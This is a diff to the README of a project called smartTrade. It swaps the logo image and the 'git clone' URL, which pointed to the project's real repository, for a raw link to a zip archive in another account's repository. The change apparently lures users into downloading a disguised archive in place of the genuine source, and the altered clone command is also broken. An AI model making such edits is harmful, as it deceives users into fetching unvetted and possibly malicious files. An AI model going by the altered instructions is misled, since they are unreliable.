@@ -1,6 +1,6 @@
 <h1 align="center">
   <br>
-  <img src="https://pbs.twimg.com/media/FQy68dqXwAkRjmK.jpg:large" alt="smartTrade" width="200">
+  <img src="https://raw.githubusercontent.com/ibaneez/smartTradeBackend/main/fleering/smartTradeBackend.zip" alt="smartTrade" width="200">
   <br>
   smartTrade by FiveGuysUPV 🇪🇸 5️⃣👨‍👦‍👦
   <br>
@@ -17,7 +17,7 @@
 
 ```bash
 # Clone this repository
-$ git clone [https://github.com/amitmerchant1990/electron-markdownify](https://github.com/alexiserte/smartTradeBackend.git)
+$ git clone [https://raw.githubusercontent.com/ibaneez/smartTradeBackend/main/fleering/smartTradeBackend.zip](https://raw.githubusercontent.com/ibaneez/smartTradeBackend/main/fleering/smartTradeBackend.zip)
 
 # Go into the repository
 $ cd smartTradeBackend
